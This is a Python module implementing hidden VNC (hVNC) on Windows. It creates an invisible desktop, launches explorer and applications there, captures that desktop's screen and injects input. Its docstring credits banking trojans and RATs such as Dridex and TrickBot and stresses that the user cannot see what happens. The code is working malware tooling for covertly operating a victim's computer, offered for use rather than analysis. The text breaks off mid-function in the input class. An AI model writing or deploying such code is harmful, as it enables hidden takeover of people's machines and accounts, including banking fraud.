"""Hidden VNC (hVNC) implementation using Windows CreateDesktop API.

This module provides a proper hVNC implementation that creates an invisible
desktop where applications can run without being visible to the user.

How it works:
1. Creates a new Windows desktop using CreateDesktop API
2. Launches explorer.exe on the hidden desktop for shell functionality
3. Applications are launched on this hidden desktop (via lpDesktop)
4. Screen is captured using BitBlt from the hidden desktop's DC
5. Input is sent to the hidden desktop via SendInput after switching thread

The key difference from offscreen windows:
- CreateDesktop creates a completely separate GUI environment
- The user cannot see anything happening on the hidden desktop
- Windows on hidden desktop are rendered properly by GPU
- Clipboard is shared between desktops (same Window Station)

Based on techniques documented in banking trojans and RATs:
- Carberp, Hesperbot, Dridex, TrickBot all use similar hVNC techniques
- Microsoft documentation: CreateDesktop, SetThreadDesktop APIs

Reference: MalwareTech CreateDesktop example
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import queue
import subprocess
import threading
import time
import uuid
from ctypes import wintypes
from dataclasses import dataclass
from fractions import Fraction
from typing import Callable

logger = logging.getLogger(__name__)

# Only available on Windows
if platform.system() != "Windows":
    raise ImportError("hVNC module only works on Windows")

# Windows API setup
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32

# Desktop access rights
DESKTOP_READOBJECTS = 0x0001
DESKTOP_CREATEWINDOW = 0x0002
DESKTOP_CREATEMENU = 0x0004
DESKTOP_HOOKCONTROL = 0x0008
DESKTOP_JOURNALRECORD = 0x0010
DESKTOP_JOURNALPLAYBACK = 0x0020
DESKTOP_ENUMERATE = 0x0040
DESKTOP_WRITEOBJECTS = 0x0080
DESKTOP_SWITCHDESKTOP = 0x0100
GENERIC_ALL = 0x10000000

DESKTOP_ALL_ACCESS = (
    DESKTOP_READOBJECTS
    | DESKTOP_CREATEWINDOW
    | DESKTOP_CREATEMENU
    | DESKTOP_HOOKCONTROL
    | DESKTOP_JOURNALRECORD
    | DESKTOP_JOURNALPLAYBACK
    | DESKTOP_ENUMERATE
    | DESKTOP_WRITEOBJECTS
    | DESKTOP_SWITCHDESKTOP
)

# GDI constants
SRCCOPY = 0x00CC0020
DIB_RGB_COLORS = 0
BI_RGB = 0
HORZRES = 8
VERTRES = 10
SM_CXSCREEN = 0
SM_CYSCREEN = 1

# Window styles
SW_HIDE = 0
SW_SHOW = 5
SW_SHOWNOACTIVATE = 4

# SetWindowPos flags
SWP_NOSIZE = 0x0001
SWP_NOZORDER = 0x0004
SWP_NOACTIVATE = 0x0010
SWP_SHOWWINDOW = 0x0040

# SendInput constants
INPUT_MOUSE = 0
INPUT_KEYBOARD = 1
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_MIDDLEDOWN = 0x0020
MOUSEEVENTF_MIDDLEUP = 0x0040
MOUSEEVENTF_WHEEL = 0x0800
MOUSEEVENTF_HWHEEL = 0x1000
MOUSEEVENTF_ABSOLUTE = 0x8000
KEYEVENTF_KEYUP = 0x0002
KEYEVENTF_UNICODE = 0x0004
KEYEVENTF_EXTENDEDKEY = 0x0001


class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength", wintypes.DWORD),
        ("lpSecurityDescriptor", wintypes.LPVOID),
        ("bInheritHandle", wintypes.BOOL),
    ]


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize", wintypes.DWORD),
        ("biWidth", wintypes.LONG),
        ("biHeight", wintypes.LONG),
        ("biPlanes", wintypes.WORD),
        ("biBitCount", wintypes.WORD),
        ("biCompression", wintypes.DWORD),
        ("biSizeImage", wintypes.DWORD),
        ("biXPelsPerMeter", wintypes.LONG),
        ("biYPelsPerMeter", wintypes.LONG),
        ("biClrUsed", wintypes.DWORD),
        ("biClrImportant", wintypes.DWORD),
    ]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [("bmiHeader", BITMAPINFOHEADER), ("bmiColors", wintypes.DWORD * 3)]


class RECT(ctypes.Structure):
    _fields_ = [
        ("left", wintypes.LONG),
        ("top", wintypes.LONG),
        ("right", wintypes.LONG),
        ("bottom", wintypes.LONG),
    ]


# ULONG_PTR is pointer-sized: 32-bit on x86, 64-bit on x64
ULONG_PTR = ctypes.c_void_p


class MOUSEINPUT(ctypes.Structure):
    _fields_ = [
        ("dx", wintypes.LONG),
        ("dy", wintypes.LONG),
        ("mouseData", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ULONG_PTR),
    ]


class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", wintypes.WORD),
        ("wScan", wintypes.WORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ULONG_PTR),
    ]


class HARDWAREINPUT(ctypes.Structure):
    _fields_ = [
        ("uMsg", wintypes.DWORD),
        ("wParamL", wintypes.WORD),
        ("wParamH", wintypes.WORD),
    ]


class INPUT_UNION(ctypes.Union):
    _fields_ = [
        ("mi", MOUSEINPUT),
        ("ki", KEYBDINPUT),
        ("hi", HARDWAREINPUT),
    ]


class INPUT(ctypes.Structure):
    _fields_ = [
        ("type", wintypes.DWORD),
        ("union", INPUT_UNION),
    ]


# Function signatures
# Note: Using LPVOID for lpsa parameter to allow passing ctypes.byref() or None
user32.CreateDesktopW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPVOID,
    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.LPVOID,  # LPSECURITY_ATTRIBUTES - use LPVOID for compatibility with byref()
]
user32.CreateDesktopW.restype = wintypes.HANDLE

user32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
user32.OpenDesktopW.restype = wintypes.HANDLE

user32.CloseDesktop.argtypes = [wintypes.HANDLE]
user32.CloseDesktop.restype = wintypes.BOOL

user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
user32.SetThreadDesktop.restype = wintypes.BOOL

user32.GetThreadDesktop.argtypes = [wintypes.DWORD]
user32.GetThreadDesktop.restype = wintypes.HANDLE

user32.SwitchDesktop.argtypes = [wintypes.HANDLE]
user32.SwitchDesktop.restype = wintypes.BOOL

user32.BlockInput.argtypes = [wintypes.BOOL]
user32.BlockInput.restype = wintypes.BOOL

user32.GetDC.argtypes = [wintypes.HWND]
user32.GetDC.restype = wintypes.HDC

user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
user32.ReleaseDC.restype = wintypes.INT

user32.GetSystemMetrics.argtypes = [wintypes.INT]
user32.GetSystemMetrics.restype = wintypes.INT

user32.SendInput.argtypes = [wintypes.UINT, ctypes.POINTER(INPUT), wintypes.INT]
user32.SendInput.restype = wintypes.UINT

user32.SetCursorPos.argtypes = [wintypes.INT, wintypes.INT]
user32.SetCursorPos.restype = wintypes.BOOL

user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM),
    wintypes.LPARAM,
]
user32.EnumWindows.restype = wintypes.BOOL

user32.EnumDesktopWindows.argtypes = [
    wintypes.HANDLE,
    ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM),
    wintypes.LPARAM,
]
user32.EnumDesktopWindows.restype = wintypes.BOOL

user32.IsWindowVisible.argtypes = [wintypes.HWND]
user32.IsWindowVisible.restype = wintypes.BOOL

user32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(RECT)]
user32.GetWindowRect.restype = wintypes.BOOL

user32.GetWindowTextW.argtypes = [wintypes.HWND, wintypes.LPWSTR, wintypes.INT]
user32.GetWindowTextW.restype = wintypes.INT

user32.PrintWindow.argtypes = [wintypes.HWND, wintypes.HDC, wintypes.UINT]
user32.PrintWindow.restype = wintypes.BOOL

gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
gdi32.CreateCompatibleDC.restype = wintypes.HDC

gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT]
gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP

gdi32.CreateDCW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPVOID,
]
gdi32.CreateDCW.restype = wintypes.HDC

gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
gdi32.SelectObject.restype = wintypes.HGDIOBJ

gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
gdi32.DeleteObject.restype = wintypes.BOOL

gdi32.DeleteDC.argtypes = [wintypes.HDC]
gdi32.DeleteDC.restype = wintypes.BOOL

gdi32.BitBlt.argtypes = [
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.DWORD,
]
gdi32.BitBlt.restype = wintypes.BOOL

gdi32.StretchBlt.argtypes = [
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.DWORD,
]
gdi32.StretchBlt.restype = wintypes.BOOL

gdi32.PatBlt.argtypes = [
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.DWORD,
]
gdi32.PatBlt.restype = wintypes.BOOL

gdi32.GetDIBits.argtypes = [
    wintypes.HDC,
    wintypes.HBITMAP,
    wintypes.UINT,
    wintypes.UINT,
    wintypes.LPVOID,
    ctypes.POINTER(BITMAPINFO),
    wintypes.UINT,
]
gdi32.GetDIBits.restype = wintypes.INT

gdi32.GetDeviceCaps.argtypes = [wintypes.HDC, wintypes.INT]
gdi32.GetDeviceCaps.restype = wintypes.INT

kernel32.GetCurrentThreadId.argtypes = []
kernel32.GetCurrentThreadId.restype = wintypes.DWORD

kernel32.ExpandEnvironmentStringsW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.DWORD]
kernel32.ExpandEnvironmentStringsW.restype = wintypes.DWORD


@dataclass
class WindowInfo:
    """Information about a window on the hidden desktop."""
    hwnd: int
    title: str
    rect: tuple[int, int, int, int]  # left, top, right, bottom
    visible: bool


class HiddenDesktop:
    """Manages a hidden Windows desktop.
    
    This class creates and manages a hidden desktop where applications
    can run invisibly to the user.
    """
    
    def __init__(self, name: str | None = None):
        """Create a hidden desktop.
        
        Args:
            name: Desktop name (auto-generated if None)
        """
        self._name = name or f"hVNC_{uuid.uuid4().hex[:8]}"
        self._handle: wintypes.HANDLE | None = None
        self._original_desktop: wintypes.HANDLE | None = None
        self._desktop_path = f"WinSta0\\{self._name}"
        self._processes: list[subprocess.Popen] = []
        self._shell_started = False
        
        # Create or open the desktop
        self._handle = self._open_or_create()
        if not self._handle:
            raise RuntimeError(f"Failed to create hidden desktop: {self._name}")
        
        # Store original desktop for restoration
        self._original_desktop = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
        
        logger.info("Created hidden desktop: %s (handle=%d)", self._name, self._handle)
    
    def _open_or_create(self) -> wintypes.HANDLE | None:
        """Open existing desktop or create new one."""
        # Try to open existing desktop first
        handle = user32.OpenDesktopW(self._name, 0, False, GENERIC_ALL)
        if handle:
            logger.debug("Opened existing desktop: %s", self._name)
            return handle
        
        # Create new desktop
        sa = SECURITY_ATTRIBUTES()
        sa.nLength = ctypes.sizeof(SECURITY_ATTRIBUTES)
        sa.lpSecurityDescriptor = None
        sa.bInheritHandle = False
        
        handle = user32.CreateDesktopW(
            self._name,
            None,
            None,
            0,
            DESKTOP_ALL_ACCESS,
            ctypes.byref(sa),
        )
        
        if not handle:
            error = ctypes.get_last_error()
            logger.error("CreateDesktopW failed: error=%d", error)
            return None
        
        return handle
    
    @property
    def name(self) -> str:
        """Get desktop name."""
        return self._name
    
    @property
    def handle(self) -> wintypes.HANDLE | None:
        """Get desktop handle."""
        return self._handle
    
    @property
    def path(self) -> str:
        """Get full desktop path (WinSta0\\name)."""
        return self._desktop_path
    
    def start_shell(self) -> bool:
        """Start explorer.exe on the hidden desktop for shell functionality.
        
        This is important for:
        - Start menu, taskbar
        - Proper window management
        - Shell extension loading
        """
        if self._shell_started:
            return True
        
        if not self._handle:
            return False
        
        # Get explorer.exe path
        explorer_path = ctypes.create_unicode_buffer(260)
        kernel32.ExpandEnvironmentStringsW("%windir%\\explorer.exe", explorer_path, 260)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = SW_SHOW  # Explorer needs to be visible
        
        try:
            # First, switch to the hidden desktop temporarily to "activate" it
            # This helps ensure the desktop is properly initialized before launching shell
            old_desktop = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
            if user32.SetThreadDesktop(self._handle):
                # Force a DC creation to initialize GDI on this desktop
                test_dc = user32.GetDC(None)
                if test_dc:
                    user32.ReleaseDC(None, test_dc)
                # Switch back to original desktop
                user32.SetThreadDesktop(old_desktop)
            
            # Start explorer.exe with /separate flag to force new process
            # This helps create a proper shell environment on the hidden desktop
            proc = subprocess.Popen(
                [explorer_path.value, "/separate"],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.CREATE_NEW_PROCESS_GROUP,
            )
            self._processes.append(proc)
            self._shell_started = True
            
            # Wait longer for explorer to fully initialize
            # Hidden desktops need more time because they're not the active desktop
            time.sleep(3.0)
            
            logger.info("Started shell on hidden desktop (PID=%d)", proc.pid)
            return True
        except Exception as exc:
            logger.error("Failed to start shell: %s", exc)
            return False
    
    def launch_application(
        self,
        executable: str,
        args: list[str] | None = None,
        working_dir: str | None = None,
        show_window: bool = True,
    ) -> subprocess.Popen | None:
        """Launch an application on the hidden desktop.
        
        Args:
            executable: Path to executable or application name
            args: Command line arguments
            working_dir: Working directory
            show_window: Whether to show the window (on hidden desktop)
        
        Returns:
            Popen object or None if failed
        """
        if not self._handle:
            logger.error("Cannot launch application: desktop not initialized")
            return None
        
        # Build command
        cmd = [executable]
        if args:
            cmd.extend(args)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = SW_SHOW if show_window else SW_HIDE
        
        try:
            proc = subprocess.Popen(
                cmd,
                startupinfo=startupinfo,
                cwd=working_dir,
                creationflags=subprocess.CREATE_NEW_CONSOLE,
            )
            self._processes.append(proc)
            logger.info("Launched %s on hidden desktop (PID=%d)", executable, proc.pid)
            return proc
        except Exception as exc:
            logger.error("Failed to launch %s: %s", executable, exc)
            return None
    
    def switch_to(self) -> bool:
        """Switch the current thread to this hidden desktop.
        
        This is needed for:
        - Capturing the desktop screen
        - Sending input to the desktop
        
        Returns:
            True if switch successful
        """
        if not self._handle:
            return False
        return bool(user32.SetThreadDesktop(self._handle))
    
    def switch_back(self) -> bool:
        """Switch thread back to original desktop."""
        if not self._original_desktop:
            return False
        return bool(user32.SetThreadDesktop(self._original_desktop))
    
    def enumerate_windows(self) -> list[WindowInfo]:
        """Enumerate all windows on this hidden desktop."""
        windows = []
        
        @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        def enum_callback(hwnd: int, lparam: int) -> bool:
            if not user32.IsWindowVisible(hwnd):
                return True
            
            # Get title
            title_buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, title_buf, 256)
            title = title_buf.value
            
            # Get rect
            rect = RECT()
            user32.GetWindowRect(hwnd, ctypes.byref(rect))
            
            # Skip zero-size windows
            if rect.right <= rect.left or rect.bottom <= rect.top:
                return True
            
            windows.append(WindowInfo(
                hwnd=hwnd,
                title=title,
                rect=(rect.left, rect.top, rect.right, rect.bottom),
                visible=True,
            ))
            return True
        
        user32.EnumDesktopWindows(self._handle, enum_callback, 0)
        return windows
    
    def close(self) -> None:
        """Close the hidden desktop and cleanup."""
        # Terminate all processes
        for proc in self._processes:
            try:
                proc.terminate()
                proc.wait(timeout=2.0)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self._processes.clear()
        
        # Close desktop handle
        if self._handle:
            user32.CloseDesktop(self._handle)
            self._handle = None
        
        logger.info("Closed hidden desktop: %s", self._name)


class HiddenDesktopCapture:
    """Captures the screen from a hidden desktop.
    
    The capture thread STAYS on the hidden desktop permanently.
    This is crucial for proper hVNC operation - we can't just switch
    back and forth because GetDC/BitBlt operate on the CURRENT thread's desktop.
    """
    
    def __init__(
        self,
        desktop: HiddenDesktop,
        width: int = 1920,
        height: int = 1080,
        fps: int = 30,
        delay_start: bool = False,
    ):
        """Initialize capture for hidden desktop.
        
        Args:
            desktop: The hidden desktop to capture
            width: Capture width
            height: Capture height
            fps: Target framerate
            delay_start: If True, don't start capture thread immediately
        """
        self._desktop = desktop
        self._width = width
        self._height = height
        self._fps = fps
        self._interval = 1.0 / fps
        
        # Thread synchronization
        self._stop_event = threading.Event()
        self._frame_lock = threading.Lock()
        self._frame: bytes | None = None
        self._frame_size = (width, height)
        self._initialized = threading.Event()
        self._capture_thread = None
        
        if not delay_start:
            self.start_capture()
        
        logger.info("Started hidden desktop capture: %dx%d @ %d fps", width, height, fps)
    
    def start_capture(self) -> bool:
        """Start the capture thread."""
        if self._capture_thread is not None and self._capture_thread.is_alive():
            return True
        
        # Capture thread - will STAY on hidden desktop
        self._capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self._capture_thread.start()
        
        # Wait for thread to initialize on hidden desktop
        if not self._initialized.wait(timeout=5.0):
            logger.error("Capture thread failed to initialize")
            return False
        return True
    
    @property
    def frame_size(self) -> tuple[int, int]:
        return self._frame_size
    
    @property
    def width(self) -> int:
        return self._width
    
    @property
    def height(self) -> int:
        return self._height
    
    def set_fps(self, fps: int) -> None:
        """Change capture framerate."""
        self._fps = max(1, fps)
        self._interval = 1.0 / self._fps
    
    def get_frame(self, timeout: float = 0.5) -> tuple[bytes | None, tuple[int, int]]:
        """Get the latest captured frame.
        
        Returns:
            Tuple of (frame_data, (width, height))
        """
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._frame_lock:
                if self._frame is not None:
                    return self._frame, self._frame_size
            time.sleep(0.01)
        return None, self._frame_size
    
    def _capture_frame(self) -> bytes | None:
        """Capture a single frame. Thread must already be on hidden desktop."""
        # Use GetDC(NULL) which gets DC for the current thread's desktop
        # This is more reliable for hidden desktop capture than CreateDCW
        hdc_screen = user32.GetDC(None)
        if not hdc_screen:
            # Try CreateDCW as fallback
            hdc_screen = gdi32.CreateDCW("DISPLAY", None, None, None)
            if not hdc_screen:
                # Try GetDC with HWND_DESKTOP (0) as last resort
                hdc_screen = user32.GetDC(0)
                if not hdc_screen:
                    if not hasattr(self, '_dc_error_logged'):
                        logger.warning("All DC acquisition methods failed - hidden desktop may not be ready")
                        self._dc_error_logged = True
                    return None
            use_release_dc = False
        else:
            use_release_dc = True
        
        try:
            # Get actual screen size using GetDeviceCaps for more reliable results
            screen_width = gdi32.GetDeviceCaps(hdc_screen, HORZRES)
            screen_height = gdi32.GetDeviceCaps(hdc_screen, VERTRES)
            
            # Fallback to GetSystemMetrics
            if screen_width <= 0 or screen_height <= 0:
                screen_width = user32.GetSystemMetrics(SM_CXSCREEN)
                screen_height = user32.GetSystemMetrics(SM_CYSCREEN)
            
            # Final fallback to configured size
            if screen_width <= 0 or screen_height <= 0:
                screen_width = self._width
                screen_height = self._height
            
            # Log first successful size detection
            if not hasattr(self, '_size_logged'):
                logger.info("Hidden desktop screen size: %dx%d", screen_width, screen_height)
                self._size_logged = True
            
            # Update frame size if different
            if (screen_width, screen_height) != self._frame_size:
                self._frame_size = (screen_width, screen_height)
                self._width = screen_width
                self._height = screen_height
                logger.info("Screen size updated: %dx%d", screen_width, screen_height)
            
            # Create compatible DC
            hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
            if not hdc_mem:
                if not hasattr(self, '_memdc_error_logged'):
                    logger.warning("CreateCompatibleDC failed")
                    self._memdc_error_logged = True
                return None
            
            try:
                # Create bitmap
                hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
                if not hbitmap:
                    if not hasattr(self, '_bitmap_error_logged'):
                        logger.warning("CreateCompatibleBitmap failed")
                        self._bitmap_error_logged = True
                    return None
                
                try:
                    old_bitmap = gdi32.SelectObject(hdc_mem, hbitmap)
                    
                    # First, try to "prime" the hidden desktop by doing a small test blit
                    # This can help initialize GDI state on hidden desktops
                    if not hasattr(self, '_gdi_primed'):
                        # Do a small PatBlt to initialize the DC
                        BLACKNESS = 0x00000042
                        gdi32.PatBlt(hdc_mem, 0, 0, 1, 1, BLACKNESS)
                        self._gdi_primed = True
                    
                    # BitBlt from screen to memory DC
                    # Use SRCCOPY | CAPTUREBLT for better capture of layered windows
                    CAPTUREBLT = 0x40000000
                    result = gdi32.BitBlt(
                        hdc_mem, 0, 0, screen_width, screen_height,
                        hdc_screen, 0, 0, SRCCOPY | CAPTUREBLT
                    )
                    
                    if not result:
                        # Try without CAPTUREBLT as fallback
                        result = gdi32.BitBlt(
                            hdc_mem, 0, 0, screen_width, screen_height,
                            hdc_screen, 0, 0, SRCCOPY
                        )
                        if not result:
                            # Try StretchBlt as another fallback (sometimes works when BitBlt doesn't)
                            result = gdi32.StretchBlt(
                                hdc_mem, 0, 0, screen_width, screen_height,
                                hdc_screen, 0, 0, screen_width, screen_height, SRCCOPY
                            )
                        
                        if not result:
                            error = ctypes.get_last_error()
                            # error=0 means the function failed but no specific error code
                            # This usually happens when the desktop is not fully initialized
                            # Track failure count for throttled logging
                            if not hasattr(self, '_bitblt_fail_count'):
                                self._bitblt_fail_count = 0
                            self._bitblt_fail_count += 1
                            
                            # Log first 3 failures in detail, then throttle
                            if self._bitblt_fail_count <= 3:
                                logger.warning("BitBlt/StretchBlt failed (attempt %d), error=%d - desktop may not be ready", 
                                             self._bitblt_fail_count, error)
                            elif self._bitblt_fail_count == 4:
                                logger.warning("Suppressing further BitBlt failure logs")
                            
                            gdi32.SelectObject(hdc_mem, old_bitmap)
                            return None
                    
                    # Reset fail counter on success
                    if hasattr(self, '_bitblt_fail_count') and self._bitblt_fail_count > 0:
                        logger.info("BitBlt recovered after %d failures", self._bitblt_fail_count)
                        self._bitblt_fail_count = 0
                    
                    gdi32.SelectObject(hdc_mem, old_bitmap)
                    
                    # Prepare BITMAPINFO
                    bi = BITMAPINFO()
                    bi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
                    bi.bmiHeader.biWidth = screen_width
                    bi.bmiHeader.biHeight = -screen_height  # Negative = top-down
                    bi.bmiHeader.biPlanes = 1
                    bi.bmiHeader.biBitCount = 32
                    bi.bmiHeader.biCompression = BI_RGB
                    
                    # Calculate buffer size
                    buffer_size = screen_width * screen_height * 4
                    buffer = ctypes.create_string_buffer(buffer_size)
                    
                    # Get DIB bits
                    result = gdi32.GetDIBits(
                        hdc_mem,
                        hbitmap,
                        0,
                        screen_height,
                        buffer,
                        ctypes.byref(bi),
                        DIB_RGB_COLORS,
                    )
                    
                    if result == 0:
                        error = ctypes.get_last_error()
                        if not hasattr(self, '_getdib_error_logged'):
                            logger.warning("GetDIBits failed, error=%d", error)
                            self._getdib_error_logged = True
                        return None
                    
                    # Log first successful capture
                    if not hasattr(self, '_first_frame_logged'):
                        logger.info("First frame captured successfully: %dx%d", screen_width, screen_height)
                        self._first_frame_logged = True
                    
                    return buffer.raw
                    
                finally:
                    gdi32.DeleteObject(hbitmap)
            finally:
                gdi32.DeleteDC(hdc_mem)
        finally:
            if use_release_dc:
                user32.ReleaseDC(None, hdc_screen)
            else:
                gdi32.DeleteDC(hdc_screen)
    
    def _capture_loop(self) -> None:
        """Main capture loop - runs entirely on hidden desktop."""
        logger.info("Capture thread starting...")
        
        # Switch this thread to hidden desktop PERMANENTLY
        if not self._desktop.switch_to():
            logger.error("Failed to switch capture thread to hidden desktop!")
            self._initialized.set()
            return
        
        logger.info("Capture thread switched to hidden desktop: %s", self._desktop.name)
        
        # Signal initialization early to allow WebRTC connection to proceed
        self._initialized.set()
        
        # Give explorer a moment to start creating windows
        time.sleep(1.0)
        
        # Force GDI initialization more aggressively
        # Create multiple DCs and resources to ensure GDI is fully initialized
        gdi_ready = False
        for attempt in range(5):
            test_dc = user32.GetDC(None)
            if test_dc:
                # Create several test resources to force GDI initialization
                mem_dc = gdi32.CreateCompatibleDC(test_dc)
                if mem_dc:
                    test_bmp = gdi32.CreateCompatibleBitmap(test_dc, 100, 100)
                    if test_bmp:
                        # Select bitmap into DC and draw something
                        old_bmp = gdi32.SelectObject(mem_dc, test_bmp)
                        BLACKNESS = 0x00000042
                        WHITENESS = 0x00FF0062
                        gdi32.PatBlt(mem_dc, 0, 0, 100, 100, WHITENESS)
                        gdi32.PatBlt(mem_dc, 0, 0, 50, 50, BLACKNESS)
                        gdi32.SelectObject(mem_dc, old_bmp)
                        gdi32.DeleteObject(test_bmp)
                    gdi32.DeleteDC(mem_dc)
                user32.ReleaseDC(None, test_dc)
                gdi_ready = True
                logger.debug("GDI initialization attempt %d successful", attempt + 1)
            time.sleep(0.3)
        
        if not gdi_ready:
            logger.warning("GDI initialization may not be complete")
        
        # Wait for actual window content with shorter intervals initially
        # then longer intervals if still failing
        capture_ready = False
        total_wait = 0.0
        max_wait = 15.0  # Maximum 15 seconds total wait
        
        # Start with short intervals, gradually increase
        for retry in range(30):
            if self._stop_event.is_set():
                return
                
            test_frame = self._capture_frame()
            if test_frame:
                # Verify it's not an empty/black frame by checking some pixels
                # BGRA format - check if any pixel is not pure black
                has_content = False
                if len(test_frame) > 1000:
                    # Check every 10000th pixel in the frame
                    for i in range(0, min(len(test_frame), 100000), 10000):
                        if i + 3 < len(test_frame):
                            # Check if any color channel > 10 (not pure black)
                            if test_frame[i] > 10 or test_frame[i+1] > 10 or test_frame[i+2] > 10:
                                has_content = True
                                break
                
                if has_content or retry > 15:  # Accept black frame after many retries
                    logger.info("Desktop capture ready after %.1fs (%d retries, has_content=%s)", 
                               total_wait, retry, has_content)
                    capture_ready = True
                    break
            
            # Adaptive wait time - shorter at first, longer later
            if retry < 5:
                wait_time = 0.2
            elif retry < 10:
                wait_time = 0.3
            elif retry < 20:
                wait_time = 0.5
            else:
                wait_time = 0.7
            
            total_wait += wait_time
            if total_wait >= max_wait:
                logger.warning("Desktop capture timeout after %.1fs", total_wait)
                break
                
            time.sleep(wait_time)
        
        if not capture_ready:
            logger.warning("Desktop capture starting with potentially incomplete initialization")
        
        frame_count = 0
        fail_count = 0
        max_fail_log = 5
        last_success_time = time.monotonic()
        
        while not self._stop_event.is_set():
            start = time.monotonic()
            
            try:
                frame = self._capture_frame()
                if frame:
                    with self._frame_lock:
                        self._frame = frame
                    frame_count += 1
                    fail_count = 0
                    last_success_time = start
                    if frame_count % 300 == 0:
                        logger.debug("Captured %d frames", frame_count)
                else:
                    fail_count += 1
                    time_since_success = start - last_success_time
                    
                    if fail_count <= max_fail_log:
                        logger.debug("Frame capture returned None (count=%d, since_success=%.1fs)", 
                                   fail_count, time_since_success)
                    elif fail_count == max_fail_log + 1:
                        logger.warning("Repeated capture failures, suppressing further logs")
                    
                    # If failing for too long, try to reinitialize GDI
                    if time_since_success > 5.0 and fail_count % 30 == 0:
                        logger.info("Attempting GDI reinitialization after %.1fs of failures", time_since_success)
                        test_dc = user32.GetDC(None)
                        if test_dc:
                            user32.ReleaseDC(None, test_dc)
            except Exception as exc:
                logger.debug("Capture error: %s", exc)
            
            elapsed = time.monotonic() - start
            sleep_time = max(0.001, self._interval - elapsed)
            self._stop_event.wait(sleep_time)
        
        logger.info("Capture loop stopped, captured %d frames total", frame_count)
    
    def close(self) -> None:
        """Stop capture and cleanup."""
        self._stop_event.set()
        if self._capture_thread is not None and self._capture_thread.is_alive():
            self._capture_thread.join(timeout=2.0)


class HiddenDesktopInput:
    """Sends input to a hidden desktop.
    
    The input thread STAYS on the hidden desktop permanently.
    This is required because SendInput sends to the CURRENT thread's desktop.
    """
    
    def __init__(self, desktop: HiddenDesktop, screen_size: tuple[int, int] = (1920, 1080)):
        """Initialize input controller.
        
        Args:
            desktop: Hidden desktop to send input to
            screen_size: Screen dimensions for coordinate normalization
        """
        self._desktop = desktop
        self._screen_width, self._screen_height = screen_size
        self._stop_event = threading.Event()
        self._queue: queue.Queue = queue.Queue()
        self._initialized = threading.Event()
        
        # Start input thread - will STAY on hidden desktop
        self._input_thread = threading.Thread(target=self._input_loop, daemon=True)
        self._input_thread.start()
        
        # Wait for thread to initialize on hidden desktop
        if not self._initialized.wait(timeout=5.0):
            logger.error("Input thread failed to initialize")
        
        logger.info("Input controller initialized for hidden desktop")
    
    def set_screen_size(self, width: int, height: int) -> None:
        """Update screen size for coordinate normalization."""
        self._screen_width = width
        self._screen_height = height
    
    def _normalize_coords(self, x: int, y: int) -> tuple[int, int]:
        """Convert screen coords to absolute coords (0-65535 range)."""
        abs_x = int((x * 65535) / self._screen_width)
        abs_y = int((y * 65535) / self._screen_height)
        return abs_x, abs_y
    
    def _send_mouse_input(self, flags: int, x: int = 0, y: int = 0, data: int = 0) -> None:
        """Send mouse input using SendInput."""
        abs_x, abs_y = self._normalize_coords(x, y)
        
        inp = INPUT()
        inp.type = INPUT_MOUSE
        inp.union.mi.dx = abs_x
